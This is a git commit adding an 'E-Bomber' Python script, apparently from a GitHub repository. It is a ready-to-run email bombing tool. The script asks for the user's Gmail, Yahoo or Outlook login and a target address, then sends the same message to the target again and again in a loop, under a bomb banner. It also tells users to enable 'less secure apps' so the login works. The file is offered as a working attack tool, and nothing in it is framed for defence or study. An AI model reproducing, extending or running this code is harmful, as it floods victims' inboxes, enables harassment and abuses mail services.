f18099d5b71391d1f2b9dc8e803ab03251ef1e8a
SupremeInGithub <46750304+SupremeInGithub@users.noreply.github.com>
2019-01-16 16:56:26 +0100

    EmailBomber

--- E-Bomber.py
+++ E-Bomber.py
@@ -1,48 +1,152 @@
-import os
+#!/usr/bin/python
 import smtplib
+import time
+import os
 import getpass
 import sys
 
+class bcolors:
+	OKGREEN = '\033[92m'
+	WARNING = '\033[93m'
+	FAIL = '\033[91m'
+	ENDC = '\033[0m'
 
-server = raw_input ('MailServer Gmail/Yahoo: ')
-user = raw_input('Email: ')
-passwd = getpass.getpass('Password: ')
+
+def bomb():
+	os.system('clear')
+	print bcolors.OKGREEN + '''
+			 \|/
+                       `--+--'
+                          |
+                      ,--'#`--.
+                      |#######|
+                   _.-'#######`-._
+                ,-'###############`-.
+              ,'#####################`,         .___     .__         .
+             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
+            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
+           |#############################|
+           |#############################|              Author: I don't know
+           |#############################|
+            |###########################|
+             \#########################/
+              `.#####################,'
+                `._###############_,'
+                   `--..#####..--'                                 ,-.--.
+*.______________________________________________________________,' (Bomb)
+                                                                    `--' ''' + bcolors.ENDC
 
 
-to = raw_input('\nTo: ')
-#subject = raw_input('Subject: ') 
-body = raw_input('Message: ')
-total = input('Number of send: ')
-
-if server == 'gmail':
-    smtp_server = 'smtp.gmail.com'
-    port = 587
-elif server == 'yahoo':
-    smtp_server = 'smtp.mail.yahoo.com'
-    port = 25
-else:
-    print 'Applies only to gmail and yahoo.'
-    sys.exit()
-
-print ''
-
+os.system('clear')
 try:
-    server = smtplib.SMTP(smtp_server,port) 
-    server.ehlo()
-    if smtp_server == "smtp.gmail.com":
-            server.starttls()
-    server.login(user,passwd)
-    for i in range(1, total+1):
-        subject = os.urandom(9)
-        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
-        server.sendmail(user,to,msg)
-        print "\rE-mails sent: %i" % i
-        sys.stdout.flush()
-    server.quit()
-    print '\n Done !!!'
+	file1 = open('Banner.txt', 'r')
+	print(' ')
+	print bcolors.OKGREEN + file1.read() + bcolors.ENDC
+	file1.close()
+except IOError:
+	print('Banner File not found')
+
+#Input
+print(bcolors.WARNING + '''
+Choose a Mail Service:
+1) Gmail
+2) Yahoo
+3) Hotmail/Outlook
+''' + bcolors.ENDC + '--------------------------------------------------------------')
+try:
+	server = raw_input(bcolors.OKGREEN + 'Mail Server: ' + bcolors.ENDC)
+	user = raw_input(bcolors.OKGREEN + 'Your Email: ' + bcolors.ENDC)
+	pwd = getpass.getpass(bcolors.OKGREEN + 'Password: ' + bcolors.ENDC)
+	to = raw_input(bcolors.OKGREEN + 'To: ' + bcolors.ENDC)
+	subject = raw_input(bcolors.OKGREEN + 'Subject (Optional): ' + bcolors.ENDC)
+	body = raw_input(bcolors.OKGREEN + 'Message: ' + bcolors.ENDC)
+	nomes = input(bcolors.OKGREEN + 'Number of Emails to send: ' + bcolors.ENDC)
+	no = 0
+	message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
 except KeyboardInterrupt:
-    print '[-] Canceled'
-    sys.exit()
-except smtplib.SMTPAuthenticationError:
-    print '\n[!] The username or password you entered is incorrect.'
-    sys.exit()
+	print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
+	sys.exit()
+
+#Gmail
+
+if server == '1' or server == 'gmail' or server == 'Gmail':
+	bomb()
+	server = smtplib.SMTP("smtp.gmail.com", 587)
+	server.ehlo()
+	server.starttls()
+	try:
+		server.login(user, pwd)
+	except smtplib.SMTPAuthenticationError:
+		print bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
+		Or you need to enable less secure apps
+		On Gmail: https://myaccount.google.com/lesssecureapps ''' + bcolors.ENDC
+		sys.exit()
+	while no != nomes:
+		try:
+			server.sendmail(user, to, message)
+			print bcolors.WARNING + 'Successfully sent ' + str(no+1) + ' emails' + bcolors.ENDC
+			no += 1
+			time.sleep(.8)
+		except KeyboardInterrupt:
+			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
+			sys.exit()
+		except:
+			print "Failed to Send "
+	server.close()
+	
+#Yahoo
+elif server == '2' or server == 'Yahoo' or server == 'yahoo':
+	server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
+	bomb()
+	server.starttls()
+	try:
+		server.login(user, pwd)
+	except smtplib.SMTPAuthenticationError:
+		print bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
+		Or you need to enable less secure apps
+		On Yahoo: https://login.yahoo.com/account/security?.scrumb=Tiby8TXUvJt#less-secure-apps
+		''' + bcolors.ENDC
+		sys.exit()
+	while no != nomes:
+		try:
+			server.sendmail(user, to, message)
+			print bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC
+			no += 1
+			time.sleep(.8)
+		except KeyboardInterrupt:
+			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
+			sys.exit()
+		except:
+			print "Failed to Send"
+	server.close()
+	
+#Hotmail/Outlook
+elif server == '3' or server == 'outlook' or server == 'Outlook' or server == 'Hotmail' or server == 'hotmail':
+	server = smtplib.SMTP("smtp-mail.outlook.com", 587)
+	bomb()
+	server.ehlo()
+	server.starttls()
+	try:
+		server.login(user, pwd)
+	except smtplib.SMTPAuthenticationError:
+		print bcolors.FAIL + 'Your Username or Password is incorrect, please try again using the correct credentials' + bcolors.ENDC
+		sys.exit()
+	while no != nomes:
+		try:
+			server.sendmail(user, to, message)
+			print bcolors.WARNING + 'Successfully sent ' + str(no + 1) + ' emails' + bcolors.ENDC
+			no += 1
+			time.sleep(.8)
+		except KeyboardInterrupt:
+			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
+			sys.exit()
+		except smtplib.SMTPAuthenticationError:
+			print '\nThe username or password you entered is incorrect.'
+			sys.exit()
+		except:
+			print "Failed to Send "
+	server.close()
+	
+else:
+	print 'Works only with Gmail, Yahoo, Outlook and Hotmail.'
+	sys.exit()
